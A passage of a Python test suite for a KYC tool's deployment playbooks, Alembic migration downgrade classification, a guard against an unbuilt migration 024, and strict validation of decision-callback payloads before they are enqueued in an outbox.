    """The evidence check is what stops an answer being justified by an invented quote."""
    fabricated = playbook.RollbackFact(
        playbook.WINDOW, playbook.WINDOW_SAME, "rollback may be performed at any time"
    )
    pr6 = next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
               if p.name == "Bundle-pinning activation")
    assert fabricated.evidence.lower() not in _playbook_prose(pr6.playbook_ref)
    # every quote the shipped contracts actually use IS present — same check, opposite direction
    for procedure in OPERATIONS.value("OPS.CUTOVER.PROCEDURES"):
        prose = _playbook_prose(procedure.playbook_ref)
        for fact in procedure.rollback_contract.facts:
            if fact.evidence:
                assert fact.evidence.lower() in prose


def test_downgrade_classifier_separates_unconditional_refusal_from_conditional(tmp_path):
    """The schema answer is only as good as this split, so it is tested on fixtures where the
    right answer is known by construction, not just on the repo's own migrations."""
    cases = {
        "always.py": "def downgrade():\n    raise RuntimeError('no')\n",
        "always_with_docstring.py": "def downgrade():\n    '''doc'''\n    raise RuntimeError('no')\n",
        "conditional.py": "def downgrade():\n    if witnesses():\n        raise RuntimeError('no')\n"
                          "    op.drop_column('t', 'c')\n",
        "noop.py": "def downgrade():\n    pass\n",
        "reverses.py": "def downgrade():\n    op.drop_column('t', 'c')\n",
    }
    for name, source in cases.items():
        (tmp_path / name).write_text(source)
    assert _downgrade_kind(tmp_path / "always.py") == "refuses_always"
    assert _downgrade_kind(tmp_path / "always_with_docstring.py") == "refuses_always"
    assert _downgrade_kind(tmp_path / "conditional.py") == "refuses_conditionally"
    assert _downgrade_kind(tmp_path / "noop.py") == "no_op"
    assert _downgrade_kind(tmp_path / "reverses.py") == "reverses"


def test_the_repo_s_own_migrations_classify_as_the_contract_needs():
    """The derivation feeding PR 7b-core's schema answer, read off the real tree."""
    def kind(revision: str) -> str:
        return _downgrade_kind(next((REPO / "alembic" / "versions").glob(f"{revision}_*.py")))

    for revision in ("018", "019", "020", "021", "022"):
        assert kind(revision) == "refuses_always", f"{revision} no longer refuses outright"
    for revision in ("013", "014", "015", "016", "017"):
        assert kind(revision) == "refuses_conditionally", f"{revision} changed shape"
    assert kind("023") == "no_op"


def test_schema_answer_is_recomputed_from_migrations_not_trusted():
    """A procedure that understates its own boundary is caught by the migrations, not by prose.

    The mutation has to be built as a whole legal contract — SCHEMA_STAYS forces the reversibility
    answer away from the boundary too, which is the point of that invariant — and it still fails,
    because the revisions it names refuse unconditionally.
    """
    pr7b = next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
                if p.name == "Migrations 013-023")
    assert _schema_answer_from_migrations(pr7b.migration_range) == playbook.SCHEMA_CONDITIONAL

    understated = playbook.RollbackContract(_valid_facts())  # schema=STAYS, reversibility=mild
    assert understated.answer(playbook.SCHEMA) == playbook.SCHEMA_STAYS
    assert understated.answer(playbook.SCHEMA) != _schema_answer_from_migrations(
        pr7b.migration_range
    ), "a procedure could understate the 018 boundary and the migrations would not notice"

    # and the derivation is total over the shapes the tree can present
    assert _schema_answer_from_migrations(()) == playbook.SCHEMA_STAYS
    # refuses only on evidence -> still CONDITIONAL, not a clean downgrade: whether it reverses
    # depends on whether a witness exists, which is exactly what "conditional" means here
    assert _schema_answer_from_migrations(("013", "014")) == playbook.SCHEMA_CONDITIONAL
    assert _schema_answer_from_migrations(("018", "019")) == playbook.SCHEMA_FROZEN
    assert _schema_answer_from_migrations(("001", "002")) == playbook.SCHEMA_DOWNGRADES


def test_understating_the_migration_range_cannot_erase_the_boundary():
    """The F8 mutation — keep the name "Migrations 013-023", drop 013-017 from the range — is now
    UNCONSTRUCTABLE rather than detected: the range is derived from the span by walking Alembic's
    graph, `replace()` refuses to author it, and a name that disagrees with its resolved span
    refuses at construction. Tampering after construction is caught by the verifier's independent
    recompute (asserted in the OPS.CUTOVER.PROCEDURES verifier above)."""

    from docs.contracts.playbook import MigrationSpan

    pr7b = next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
                if p.name == "Migrations 013-023")

    # (a) the range cannot be authored at all. Structural first (gate finding 14): the field IS
    #     init=False, which is the property the refusal rests on; then the refusal itself, whose
    #     exception type is version-dependent (ValueError through 3.12, TypeError on 3.13+) —
    #     pinning one type made the suite fail on a declared-supported Python.
    range_field = next(f for f in dataclasses.fields(Procedure) if f.name == "migration_range")
    assert range_field.init is False
    with pytest.raises((ValueError, TypeError)):
        dataclasses.replace(pr7b, migration_range=("018", "019", "020", "021", "022", "023"))

    # (b) a name that understates its span refuses at construction
    with pytest.raises(ValueError, match="disagrees with its resolved span"):
        dataclasses.replace(pr7b, migration_span=MigrationSpan("017", "023"))

    # (c) even direct __setattr__ tampering cannot survive the independent recompute
    tampered = dataclasses.replace(pr7b)
    object.__setattr__(tampered, "migration_range",
                       ("018", "019", "020", "021", "022", "023"))
    span = tampered.migration_span
    walk = list(_alembic_script().walk_revisions(base=span.base_revision,
                                                 head=span.target_revision))
    recomputed = tuple(r.revision for r in reversed(walk) if r.revision != span.base_revision)
    assert tampered.migration_range != recomputed

    # (d) and the playbook-body bind still holds as belt over the derived range
    body = " ".join(_section_bytes(pr7b.playbook_ref).split())
    assert {"018", "022"} <= _forward_only_revisions_named_in(body)
    _assert_range_covers_forward_only(pr7b, body, pr7b.playbook_ref.heading)


def test_a_span_cannot_name_a_walk_the_graph_does_not_contain():
    """Codex's endpoint REDs: unbuilt, reversed, self, and unknown endpoints all refuse."""
    from alembic.util import CommandError
    from docs.contracts.operations import _resolved_migration_range
    from docs.contracts.playbook import MigrationSpan

    with pytest.raises(CommandError):
        _resolved_migration_range(MigrationSpan("012", "024"))  # unbuilt target
    with pytest.raises(CommandError):
        _resolved_migration_range(MigrationSpan("023", "013"))  # reversed
    with pytest.raises(CommandError):
        _resolved_migration_range(MigrationSpan("000", "023"))  # unknown base
    with pytest.raises(ValueError, match="installs nothing"):
        MigrationSpan("012", "012")  # self-span refused at the record


def test_the_derived_range_is_exactly_the_graph_walk():
    """Positive control: ascending, base-exclusive, target-inclusive, no gaps or duplicates."""
    from docs.contracts.operations import _resolved_migration_range
    from docs.contracts.playbook import MigrationSpan

    resolved = _resolved_migration_range(MigrationSpan("012", "023"))
    assert resolved == ("013", "014", "015", "016", "017", "018", "019", "020", "021",
                        "022", "023")
    assert len(set(resolved)) == len(resolved)


def test_older_revisions_a_playbook_merely_references_are_not_forced_into_the_range():
    """The bind has to distinguish 'this cutover installs it' from 'this section mentions it'.

    PR 6's body references 003, 005, 010, 011 and 012 for context while installing nothing — its
    cutover is the flag flip. Requiring every mentioned revision to be in the range would make the
    correct empty range fail, so only UNCONDITIONAL refusers count.
    """
    pr6 = next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
               if p.name == "Bundle-pinning activation")
    body = " ".join(_section_bytes(pr6.playbook_ref).split())
    mentioned = set(re.findall(r"\b(0\d{2})\b", body))
    assert {"003", "005", "010", "011", "012"} <= mentioned, sorted(mentioned)
    assert not _forward_only_revisions_named_in(body), (
        "PR 6 references older revisions for context; none of them is forward-only, so its empty "
        "migration_range is consistent with its playbook"
    )
    assert pr6.migration_range == ()


# ── F12: the 024 staleness guard, proven to bite ───────────────────────────────────────────────
#
# Codex's four reproductions, each run through the SAME helper the release verifier calls. The old
# guard globbed a directory that does not exist, so it passed all four.


def _fake_script(tmp_path, revisions: dict) -> ScriptDirectory:
    """A throwaway Alembic tree. `revisions` maps revision id -> down_revision (None for base)."""
    versions = tmp_path / "versions"
    versions.mkdir(parents=True, exist_ok=True)
    for revision, down in revisions.items():
        down_literal = "None" if down is None else f'"{down}"'
        (versions / f"{revision}_probe.py").write_text(
            f'"""probe {revision}"""\nrevision = "{revision}"\n'
            f"down_revision = {down_literal}\nbranch_labels = None\ndepends_on = None\n"
            "def upgrade():\n    pass\n\n\ndef downgrade():\n    pass\n"
        )
    return _alembic_script(script_location=tmp_path)


class _Model:
    """Stand-in for the callback model; only `model_fields` is read."""

    def __init__(self, *names):
        self.model_fields = dict.fromkeys(names)


def test_the_shipped_tree_is_genuinely_pending():
    """Baseline. Without this, every rejection below could be the helper failing on anything."""
    assert_024_unbuilt(_alembic_script(), DecisionCallback)


def test_024_present_while_pending_is_caught(tmp_path):
    script = _fake_script(tmp_path, {"022": None, "023": "022", "024": "023"})
    with pytest.raises(AssertionError, match="is stale"):
        assert_024_unbuilt(script, _Model("case_id"))


def test_024_on_a_multiple_head_branch_is_caught(tmp_path):
    """The interesting shape: 024 lands beside the existing head rather than after it, so a check
    that only followed the single head would walk straight past it."""
    script = _fake_script(tmp_path, {"022": None, "023": "022", "024": "022"})
    with pytest.raises(AssertionError, match="heads"):
        assert_024_unbuilt(script, _Model("case_id"))


def test_024_present_without_the_callback_field_is_caught(tmp_path):
    """Half-built from the schema side: the revision exists, the wire has not caught up."""
    script = _fake_script(tmp_path, {"023": None, "024": "023"})
    with pytest.raises(AssertionError, match="is stale"):
        assert_024_unbuilt(script, _Model("case_id", "event_sequence"))


def test_the_callback_field_present_while_the_revision_is_absent_is_caught(tmp_path):
    """Half-built from the wire side, and the direction the old guard could never have seen: the
    integrator meets `decision_sequence` on the callback while the document says NOT BUILT."""
    script = _fake_script(tmp_path, {"022": None, "023": "022"})
    with pytest.raises(AssertionError, match="decision_sequence"):
        assert_024_unbuilt(script, _Model("case_id", "decision_sequence"))


def test_the_guard_reads_alembic_not_a_directory_path():
    """The defect itself: the old check globbed `REPO/migrations/versions`, which does not exist,
    so its revision set was empty no matter what was on disk. Pin the layout it actually uses."""
    assert not (REPO / "migrations").exists(), (
        "a `migrations/` tree now exists; the guard reads alembic.ini's script_location, so "
        "confirm which one Alembic is configured to use before changing anything"
    )
    assert (REPO / "alembic" / "versions").is_dir()
    assert {r.revision for r in _alembic_script().walk_revisions()}, (
        "the script directory resolved to an empty revision set — the same vacuous-pass shape "
        "this test exists to prevent"
    )


def test_the_guard_uses_the_CONFIGURED_tree_not_the_conventional_one(tmp_path):
    """Re-gate finding 5. The first version built a `ScriptDirectory` directly, so it never routed
    the divergent config through `_alembic_script()` — restoring the defective unconditional
    override left every one of these tests green. It now goes through the production helper, and
    asserts both the resolved path and the discovered revisions come from the CONFIGURED tree.
    """
    configured = tmp_path / "canonical"
    (configured / "versions").mkdir(parents=True)
    for revision, down in (("023", None), ("024", "023")):
        (configured / "versions" / f"{revision}_probe.py").write_text(
            f'"""probe"""\nrevision = "{revision}"\ndown_revision = '
            f'{"None" if down is None else repr(down)}\n'
            "branch_labels = None\ndepends_on = None\n"
            "def upgrade():\n    pass\n\n\ndef downgrade():\n    pass\n")
    ini = tmp_path / "alembic.ini"
    ini.write_text(f"[alembic]\nscript_location = {configured}\n")

    resolved = _alembic_script(config_path=ini)
    assert Path(resolved.dir).resolve() == configured.resolve()
    assert {r.revision for r in resolved.walk_revisions()} == {"023", "024"}
    with pytest.raises(AssertionError, match="is stale"):
        assert_024_unbuilt(resolved, _Model("case_id"))


def test_the_helper_resolves_a_relative_script_location_independently_of_cwd(tmp_path):
    """The repo's own config uses a RELATIVE `script_location`, so a helper that resolved it
    against the process cwd would pass or fail by accident depending on where pytest ran."""
    tree = tmp_path / "alembic"
    (tree / "versions").mkdir(parents=True)
    (tree / "versions" / "001_probe.py").write_text(
        '"""probe"""\nrevision = "001"\ndown_revision = None\n'
        "branch_labels = None\ndepends_on = None\n"
        "def upgrade():\n    pass\n\n\ndef downgrade():\n    pass\n")
    ini = tmp_path / "alembic.ini"
    ini.write_text("[alembic]\nscript_location = alembic\n")
    resolved = _alembic_script(config_path=ini)
    assert Path(resolved.dir).resolve() == tree.resolve()


def test_the_production_helper_resolves_the_repo_configured_tree():
    declared = Config(str(REPO / "alembic.ini")).get_main_option("script_location")
    expected = (REPO / declared).resolve() if not Path(declared).is_absolute() else Path(
        declared).resolve()
    assert Path(_alembic_script().dir).resolve() == expected


def _sequenced_callback_attempt() -> dict:
    """A well-formed callback body that ALSO tries to carry the post-024 ordering key."""
    return {
        "case_id": "c1",
        "run_id": "r1",
        "event_id": "e1",
        "decision": "approve",
        "score": 10,
        "gates": dict.fromkeys(GatesBody.model_fields, True),
        "buy_enablement": "enabled",
        "checks": [],
        "decided_at": "2026-08-12T00:00:00+00:00",
        "decision_sequence": 7,
    }


def test_the_publisher_cannot_emit_an_unmodelled_ordering_key():
    """Gate finding 6, closed structurally rather than by inspection.

    Codex added `decision_sequence` to `Pipeline._callback_body` and every check stayed green,
    because the emitter built a plain dict and the guard read a model nobody routed through. The
    enqueue path now goes through `encode_decision_callback`, so an unmodelled key is REFUSED
    before it can reach the outbox — the emitter cannot publish a field the contract does not
    declare, whatever it puts in the dict.
    """
    with pytest.raises(PydanticValidationError):
        schemas.encode_decision_callback(_sequenced_callback_attempt())
    clean = _sequenced_callback_attempt()
    clean.pop("decision_sequence")
    emitted = schemas.encode_decision_callback(clean)
    assert emitted["case_id"] == "c1" and emitted["decided_at"].startswith("2026-08-12")


def test_the_enqueued_body_is_the_encoder_s_output(monkeypatch):
    """The routing itself: whatever `_callback_body` returns, what reaches the outbox is the
    encoder's validated output. Proven by making the emitter hostile and watching the wire."""
    from kyc_tool.orchestration import pipeline as pipeline_module

    source = (SRC / "orchestration" / "pipeline.py").read_text()
    assert "body = encode_decision_callback(body)" in source, (
        "the enqueue path no longer routes through the authoritative encoder"
    )
    # and the encoder is applied AFTER the optional fields are attached, so validation covers the
    # whole body rather than a prefix of it
    encoded_at = source.index("body = encode_decision_callback(body)")
    held_at = source.index('body["enforcement_held"]')
    assert held_at < encoded_at, "enforcement_held is attached after encoding, so it is unvalidated"
    assert pipeline_module.encode_decision_callback is schemas.encode_decision_callback


def test_the_optional_fields_still_survive_encoding():
    """Guard the guard: dropping unmodelled keys must not drop MODELLED optional ones. Both
    `event_sequence` and `enforcement_held` exist precisely so validation preserves them."""
    payload = _sequenced_callback_attempt()
    payload.pop("decision_sequence")
    payload["event_sequence"] = 4
    payload["enforcement_held"] = {"computed_decision": "approve", "reason": "x"}
    emitted = schemas.encode_decision_callback(payload)
    assert emitted["event_sequence"] == 4
    assert emitted["enforcement_held"]["computed_decision"] == "approve"


def test_a_sequenced_wire_version_without_024_fails():
    """Codex's matrix, third case, now aimed at the PUBLISHER's own value (re-gate finding 4).
    Patching a parallel constant in `schemas` proved nothing about what gets persisted."""
    with (
        mock.patch.object(publisher, "_WIRE_VERSION", "sequenced"),
        pytest.raises(AssertionError, match="advertises"),
    ):
        assert_024_unbuilt(_alembic_script(), DecisionCallback)


def test_an_encoder_that_emits_the_sequence_fails_even_with_the_model_clean():
    """Fourth case: the model stays clean and the ENCODER starts emitting. This is the direction
    the old declaration-reading guard was blind to."""
    original = schemas.encode_decision_callback

    def leaking_encoder(payload):
        """An encoder that ACCEPTS the ordering key instead of refusing it."""
        clean = {k: v for k, v in payload.items() if k != "decision_sequence"}
        return {**original(clean), "decision_sequence": payload.get("decision_sequence", 7)}

    with (
        mock.patch.object(schemas, "encode_decision_callback", leaking_encoder),
        pytest.raises(AssertionError, match="accepted `decision_sequence`"),
    ):
        assert_024_unbuilt(_alembic_script(), DecisionCallback)


# ── re-gate finding 3: the ENQUEUE boundary is the serialization authority ─────────────────────
class _CapturingSession:
    """Captures what would be persisted, without a database."""

    def __init__(self):
        self.added = []

    def add(self, obj):
        self.added.append(obj)


def _clean_callback_body() -> dict:
    body = _sequenced_callback_attempt()
    body.pop("decision_sequence")
    return body


def test_enqueue_refuses_an_ordering_key_whatever_the_caller_assembled():
    """Validating in the pipeline sanitized ONE caller's dict. Adding the key after that call, or
    calling enqueue directly, stored it verbatim because the enqueue accepted a raw dict."""
    from kyc_tool.outbox.publisher import enqueue_decision_callback

    poisoned = {**_clean_callback_body(), "decision_sequence": 7}
    with pytest.raises(PydanticValidationError):
        enqueue_decision_callback(_CapturingSession(), body=poisoned, decision_sequence=7)


def test_enqueue_stores_the_validated_body_and_keeps_modelled_optionals():
    """Guard the guard: refusing everything would pass the test above. A clean body must persist,
    with `event_sequence` and `enforcement_held` intact — they exist to survive validation."""
    from kyc_tool.outbox.publisher import enqueue_decision_callback

    body = _clean_callback_body()
    body["event_sequence"] = 4
    body["enforcement_held"] = {"computed_decision": "approve", "reason": "x"}
    session = _CapturingSession()
    enqueue_decision_callback(session, body=body, decision_sequence=9)

    (row,) = session.added
    assert "decision_sequence" not in row.payload_json
    assert row.payload_json["event_sequence"] == 4
    assert row.payload_json["enforcement_held"]["computed_decision"] == "approve"
    # the ordering column is a COLUMN, not a wire field — it may carry the ordinal
    assert row.decision_sequence == 9


def test_row_identity_is_derived_from_the_validated_body():
    """Re-gate-3 finding 2. `case_id`/`run_id` used to be separate keyword arguments, so the
    outbox could account, order, and complete a row under one identity while the wire body named
    another — `ROW row-case row-run / BODY body-case body-run` was Codex's reproduction, and
    several integration tests were doing it silently. The arguments no longer exist: one
    authority, the validated body, and the row follows it.
    """
    import inspect

    from kyc_tool.outbox.publisher import enqueue_decision_callback

    parameters = set(inspect.signature(enqueue_decision_callback).parameters)
    assert parameters == {"session", "body", "decision_sequence"}, (
        "enqueue grew identity arguments again; the mismatch class returns with them"
    )

    body = _clean_callback_body()
    body["case_id"], body["run_id"] = "case-77", "run-77"
    session = _CapturingSession()
    enqueue_decision_callback(session, body=body, decision_sequence=1)
    (row,) = session.added
    assert (row.case_id, row.run_id) == ("case-77", "run-77")
    assert (row.payload_json["case_id"], row.payload_json["run_id"]) == ("case-77", "run-77")


def test_an_unmodelled_field_added_after_the_pipeline_encodes_is_still_refused():
    """Codex's second bypass: encode in the pipeline, then mutate before enqueue. The enqueue is
    the last authority, so the late addition cannot survive."""
    from kyc_tool.outbox.publisher import enqueue_decision_callback

    encoded = schemas.encode_decision_callback(_clean_callback_body())
    encoded["decision_sequence"] = 7  # added AFTER the pipeline's encode
    with pytest.raises(PydanticValidationError):
        enqueue_decision_callback(_CapturingSession(), body=encoded, decision_sequence=7)


# ── re-gate-3 finding 3: strictness reaches every nested wire object ───────────────────────────
NESTED_UNKNOWNS = [
    ("root", lambda b: b.__setitem__("decision_sequence", 7)),
    ("gates", lambda b: b["gates"].__setitem__("future_gate", True)),
    ("checks item", lambda b: b.__setitem__("checks", [
        {"type": "x", "status": "pass", "points": 1, "source": "s", "future_provenance": "p"}])),
    ("enforcement_held", lambda b: b.__setitem__("enforcement_held", {
        "computed_decision": "approve", "reason": "x", "future": "p"})),
]


@pytest.mark.parametrize("label,mutate", NESTED_UNKNOWNS, ids=[c[0] for c in NESTED_UNKNOWNS])
def test_an_undeclared_field_is_refused_at_every_nesting_depth(label, mutate):
    """Root-only strictness left the nested objects permissive: an unknown gate or check field was
    silently DROPPED at the encoder while leaking through any path that skipped it, and
    `enforcement_held` — a plain `dict` — was not even dropping, it was PUBLISHING arbitrary keys.
    Same accepted-here-invisible-there class, one layer down.
    """
    from kyc_tool.outbox.publisher import enqueue_decision_callback

    body = _clean_callback_body()
    mutate(body)
    with pytest.raises(PydanticValidationError):
        enqueue_decision_callback(_CapturingSession(), body=body, decision_sequence=1)


def test_exact_nested_bodies_still_serialize():
    """The positive half, through the same boundary: every declared nested field survives."""
    from kyc_tool.outbox.publisher import enqueue_decision_callback

    body = _clean_callback_body()
    body["checks"] = [{"type": "org_id", "status": "pass", "points": 10, "source": "gleif",
                       "reason_codes": ["OK"]}]
    body["event_sequence"] = 2
    body["enforcement_held"] = {"computed_decision": "approve", "reason": "hold"}
    session = _CapturingSession()
    enqueue_decision_callback(session, body=body, decision_sequence=3)
    (row,) = session.added
    assert row.payload_json["checks"][0]["reason_codes"] == ["OK"]
    assert row.payload_json["enforcement_held"] == {
        "computed_decision": "approve", "reason": "hold"}


def test_the_recorder_is_handed_the_active_wire_version():
    """Re-gate-3 finding 4, second half: the gate's literal proves what `_WIRE_VERSION` IS; this
    proves it is what `_record_attempt` actually RECEIVES. Both call sites must bind the module
    global by name — an edit that passes anything else fails here even if the global is clean."""
    import ast as ast_module

    tree = ast_module.parse((SRC / "outbox" / "publisher.py").read_text())
    handed = []
    for node in ast_module.walk(tree):
        if (isinstance(node, ast_module.Call)
                and isinstance(node.func, ast_module.Attribute)
                and node.func.attr == "_record_attempt"):
            for keyword in node.keywords:
                if keyword.arg == "wire_version":
                    handed.append(ast_module.unparse(keyword.value))
    assert handed and all(value == "_WIRE_VERSION" for value in handed), (
        f"_record_attempt is handed {handed or 'nothing'} as wire_version; the gate's literal "
        "then proves nothing about what gets persisted"
    )


# ── Wave 1 / F7: the exact-bytes reference, proven to bite ─────────────────────────────────────
def _copy_deployment(tmp_path, mutate) -> Path:
    """A repo-shaped copy of DEPLOYMENT.md with one byte-level mutation applied."""
    root = tmp_path / "repo" / "docs"
    root.mkdir(parents=True)
    text = (REPO / "docs" / "DEPLOYMENT.md").read_text()
    (root / "DEPLOYMENT.md").write_text(mutate(text))
    return tmp_path / "repo"


BYTE_MUTATIONS = [
    ("shell continuation becomes backslash-space",
     lambda t: t.replace("kyc_tool.ops.activate_bundle_pinning_epoch \\\n    --expect-bundle-hash",
                         "kyc_tool.ops.activate_bundle_pinning_epoch \\ --expect-bundle-hash", 1)),
    ("indentation change",
     lambda t: t.replace("\n    --expect-original-id <id>", "\n  --expect-original-id <id>", 1)),
    ("blank line removed",
     lambda t: t.replace("### Rollback\n\nRollback mirrors the same window",
                         "### Rollback\nRollback mirrors the same window", 1)),
    ("code fence dropped",
     lambda t: t.replace("```operator\npython -m kyc_tool.ops.seed_policy_bundle",
                         "python -m kyc_tool.ops.seed_policy_bundle", 1)),
    ("list nesting change",
     lambda t: t.replace(
         "\n1. **Preflight.** ``python -m kyc_tool.ops.verify_pinnable_backlog``",
         "\n   1. **Preflight.** ``python -m kyc_tool.ops.verify_pinnable_backlog``", 1)),
]


@pytest.mark.parametrize("label,mutate", BYTE_MUTATIONS, ids=[m[0] for m in BYTE_MUTATIONS])
def test_every_byte_level_playbook_edit_requires_a_re_pin(label, mutate, tmp_path):
    """The old digest collapsed all whitespace before hashing, so every one of these edits — the
    continuation rewrite that hands the shell a literal backslash argument included — hashed
    identically and passed review. Exact bytes make each one a digest mismatch, i.e. a forced,
    visible re-review. Routed through the SAME reader the release verifier uses."""
    root = _copy_deployment(tmp_path, mutate)
    changed = 0
    for procedure in OPERATIONS.value("OPS.CUTOVER.PROCEDURES"):
        ref = procedure.playbook_ref
        body = _section_bytes(ref, root=root)
        if hashlib.sha256(body.encode()).hexdigest() != ref.sha256:
            changed += 1
    assert changed >= 1, f"{label}: no procedure's digest moved — the edit was invisible"


def test_the_old_collapsed_digest_would_have_passed_the_continuation_rewrite(tmp_path):
    """The defect itself, kept as a specimen: whitespace-collapse hashes the broken continuation
    identically. This is why the digest moved to exact bytes."""
    original = (REPO / "docs" / "DEPLOYMENT.md").read_text()
    broken = BYTE_MUTATIONS[0][1](original)
    assert broken != original

    def collapsed(text):
        return hashlib.sha256(" ".join(text.split()).encode()).hexdigest()

    assert collapsed(broken) == collapsed(original), (
        "the collapsed digest now distinguishes them; update this specimen"
    )


def test_a_substring_heading_is_refused(tmp_path):
    """Exact full-line equality: 'PR 5b cutover' alone must not resolve. A substring match is how
    a wrong same-named section satisfied the old pointer."""
    from docs.contracts.playbook import PlaybookRef

    vague = PlaybookRef(path="docs/DEPLOYMENT.md", heading="## 9. PR 5b cutover",
                        sha256="0" * 64)
    with pytest.raises(AssertionError, match="matches 0 lines"):
        _section_bytes(vague)


def test_a_duplicated_heading_is_refused(tmp_path):
    from docs.contracts.playbook import PlaybookRef

    heading = "## 9. PR 5b cutover — brief full maintenance window"
    root = _copy_deployment(tmp_path, lambda t: t + "\n" + heading + "\n\nimpostor body\n")
    ref = PlaybookRef(path="docs/DEPLOYMENT.md", heading=heading, sha256="0" * 64)
    with pytest.raises(AssertionError, match="matches 2 lines"):
        _section_bytes(ref, root=root)


def test_a_command_edit_is_caught_even_after_a_digest_re_pin(tmp_path):
    """The record's whole value: the digest proves the section was re-read; the typed command
    records prove the commands still parse to what the operator needs. Rename an option, re-pin
    the digest over it, and the argv comparison still fails until the RECORD moves too — a
    second, visible act."""
    root = _copy_deployment(
        tmp_path, lambda t: t.replace("--expect-revision 012", "--expect-rev 012", 1))
    pr7b = next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
                if p.name == "Migrations 013-023")
    body = _section_bytes(pr7b.playbook_ref, root=root)
    # simulate the re-pin: the digest matches the edited body by construction
    repinned = hashlib.sha256(body.encode()).hexdigest()
    assert repinned != pr7b.playbook_ref.sha256  # the edit DID move the digest
    parsed = _section_commands(body)
    missing = [c for c in pr7b.playbook_ref.commands if c.argv not in parsed]
    assert missing and any("--expect-revision" in c.argv for c in missing), (
        "the option rename was invisible to the command records"
    )


def test_the_parser_reads_fenced_and_inline_commands_alike():
    """Guard the guard, and a fossil of a real near-miss: ``` fences corrupt single-backtick
    pairing (three backticks pair as one and a half spans), and the first parser silently
    mis-paired every span after a fence — the verifier failed on a command plainly on the page.
    Fenced blocks are parsed line-wise first, then removed."""
    pr6 = next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
               if p.name == "Bundle-pinning activation")
    parsed = _section_commands(_section_body(_section_bytes(pr6.playbook_ref)))
    assert "python -m kyc_tool.ops.seed_policy_bundle --expect-hash <sha256>" in parsed, (
        "operator fences must parse line-wise"
    )
    assert "python -m kyc_tool.ops.verify_pinnable_backlog" in parsed, (
        "double-backtick marked inline commands must parse"
    )
    # single-backtick spans are mentions by construction — never inventoried
    assert not any(line == "alembic upgrade head" for line in parsed), (
        "a single-backtick prose mention joined the inventory"
    )


def test_command_records_bind_line_and_argv():
    """The root restriction is GONE (re-audit finding 4: destructive roots must be typed, not
    filtered out of sight) — what binds now is line↔argv token agreement, so a lookalike line
    cannot ride a clean argv."""
    from docs.contracts.playbook import Command

    assert Command(("sha256sum", "<file.json>")).line == "sha256sum <file.json>"
    with pytest.raises(ValueError, match="token-for-token"):
        Command(("python", "-m", "x"), line="python -m y")
    with pytest.raises(ValueError):
        Command(())


# ── Wave 1 / F9: branch safety, proven to bite ─────────────────────────────────────────────────
def _pr7b():
    return next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
                if p.name == "Migrations 013-023")


def test_the_prior_image_on_the_refused_branch_is_unconstructable():
    """Codex's core F9 mutation: publish the prior image while the schema held and evidence
    survived. Refused at construction, not detected downstream."""
    with pytest.raises(ValueError, match="prior image on the REFUSED branch"):
        playbook.RollbackBranch(
            outcome=playbook.OUTCOME_REFUSED,
            facts=(
                playbook.RollbackFact(playbook.SCHEMA, playbook.BR_SCHEMA_HELD, "a"),
                playbook.RollbackFact(playbook.IMAGE, playbook.IMAGE_PRIOR, "b"),
                playbook.RollbackFact(playbook.RESTORES, playbook.RESTORES_NO, "c"),
                playbook.RollbackFact(playbook.VERIFICATION, playbook.VERIFY_NOT_STATED),
                playbook.RollbackFact(playbook.ENDING, playbook.ENDING_RESUMED, "d"),
            ))


def test_cross_branch_evidence_fails_the_span_bind(tmp_path):
    """Outcome-B's own sentence ('deploy the recorded prior-image digest') cited on the REFUSED
    branch: the quote exists in the section, but not inside R5's span, so the bind refuses."""
    import dataclasses

    pr7b = _pr7b()
    refused = next(b for b in pr7b.rollback_contract.branches
                   if b.outcome == playbook.OUTCOME_REFUSED)
    poisoned_facts = tuple(
        playbook.RollbackFact(f.question, playbook.IMAGE_SAME_RELEASE,
                              "deploy the recorded prior-image digest")
        if f.question == playbook.IMAGE else f
        for f in refused.facts
    )
    poisoned = dataclasses.replace(refused, facts=poisoned_facts)
    prose = _playbook_prose(pr7b.playbook_ref)
    start = prose.find(poisoned.span_marker.lower())
    end = prose.find("r6. rollback outcome b", start)
    span = prose[start:end]
    bad = [f for f in poisoned.facts if f.evidence and f.evidence.lower() not in span]
    assert bad, "the cross-branch quote was accepted inside the wrong span"
    assert "deploy the recorded prior-image digest" in prose, (
        "control: the quote is genuinely in the section, just in the other branch's span"
    )


def test_a_missing_branch_is_an_uncovered_outcome():
    """Drop the SUCCEEDED branch: the migrations still make it reachable (a history below the
    refusing floor walks to 012), so the claimed set no longer equals the reachable set."""
    kinds = {r: _downgrade_kind(_revision_file(r)) for r in _pr7b().migration_range}
    reachable = set()
    if any(k in ("refuses_always", "refuses_conditionally") for k in kinds.values()):
        reachable.add(playbook.OUTCOME_REFUSED)
    if not all(k == "refuses_always" for k in kinds.values()):
        reachable.add(playbook.OUTCOME_SUCCEEDED)
    assert reachable == {playbook.OUTCOME_REFUSED, playbook.OUTCOME_SUCCEEDED}
    claimed_without_success = {playbook.OUTCOME_REFUSED}
    assert claimed_without_success != reachable


def test_duplicate_and_misplaced_branches_are_refused():
    pr7b = _pr7b()
    branches = pr7b.rollback_contract.branches
    with pytest.raises(ValueError, match="duplicate branch outcomes"):
        playbook.RollbackContract(pr7b.rollback_contract.facts,
                                  branches=(branches[0], branches[0]))
    # branches on an unforked schema are refused, both ways
    pr5b = next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
                if p.name == "PR 5b full maintenance window")
    with pytest.raises(ValueError, match="CONDITIONAL schema requires resolved branches"):
        playbook.RollbackContract(pr5b.rollback_contract.facts, branches=branches)


def test_branch_schema_answers_are_results_and_stay_out_of_the_aggregate():
    """A branch cannot claim the aggregate's 'conditional' (the branch IS the resolution), and
    the aggregate cannot claim a branch's 'held'/'walked' (the aggregate names the fork)."""
    with pytest.raises(ValueError, match="schema must be a RESULT"):
        playbook.RollbackBranch(
            outcome=playbook.OUTCOME_REFUSED,
            facts=(
                playbook.RollbackFact(playbook.SCHEMA, playbook.SCHEMA_CONDITIONAL, "a"),
                playbook.RollbackFact(playbook.IMAGE, playbook.IMAGE_SAME_RELEASE, "b"),
                playbook.RollbackFact(playbook.RESTORES, playbook.RESTORES_NO, "c"),
